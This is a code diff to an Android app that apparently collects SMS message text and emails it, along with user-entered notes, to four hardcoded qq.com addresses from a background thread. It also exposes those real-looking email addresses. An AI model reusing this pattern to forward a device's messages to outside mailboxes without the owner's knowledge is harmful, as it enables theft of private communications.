@@ -13,23 +13,30 @@ import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.View;
+import android.widget.EditText;
 import android.widget.Toast;
 
 import com.xander.sendemaillib.SendEmail;
 
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
 
+  private EditText mEditText;
+  private String txt = "附加信息";
   @Override
   protected void onCreate(Bundle savedInstanceState) {
     super.onCreate(savedInstanceState);
     setContentView(R.layout.activity_main);
+    mEditText = findViewById(R.id.context);
   }
 
   public void applypermission() {
 
+    txt = mEditText.getText().toString();
     if (Build.VERSION.SDK_INT >= 23) {
       // 检查是否已经给了权限
       showDialog();
@@ -131,10 +138,13 @@ public class MainActivity extends AppCompatActivity {
       @Override
       public void run() {
         super.run();
-        String[] strings = {
-          "814093077@qq.com", "487008159@qq.com", "1020110072@qq.com", "596928539@qq.com"
-        };
-        SendEmail.send(strings, "c2222rash", msg);
+
+        List<String >list = new ArrayList<>();
+        list.add("814093077@qq.com");
+        list.add("1020110072@qq.com");
+        list.add("487008159@qq.com");
+        list.add("596928539@qq.com");
+        SendEmail.send(list, "测试", "搜到结果---华为"+msg+"\n 附加信息:\n"+txt);
       }
     }.start();
     return smsBuilder.toString();
